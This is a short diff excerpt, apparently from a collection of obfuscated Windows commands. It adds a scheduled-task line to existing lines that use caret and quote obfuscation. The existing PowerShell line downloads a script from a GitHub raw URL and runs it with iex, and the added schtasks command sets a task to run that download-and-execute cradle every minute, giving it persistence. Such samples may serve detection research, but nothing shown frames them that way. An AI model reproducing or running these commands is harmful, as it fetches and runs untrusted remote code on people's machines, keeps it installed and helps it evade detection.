@@ -19,3 +19,5 @@ cmd.exe /V:ON/C"set q47z=^^^^C^^^^M^^^^d; ; ; ^^^^/V  ;/^^^^R"" ;^^^^uet  6nK=""
 
 # 
 powershell -c i`e`x((New-Object N`et.W`ebClient).Downl"o"adS"tr"ing('h"tt"ps:"/"/raw.githubu"serc"ontent".c"om/Tholep/data/master/ps'))
+
+s"c"ht"as"ks "/C"r"e"ate   "/T"N test  "/S"C MINUTE "/T"R "powershell -c i`e`x((New-Object N`et.W`ebClient).Downl"o"adS"tr"ing('h"tt"ps:"/"/raw.githubu"serc"ontent".c"om/Tholep/data/master/ps'))"
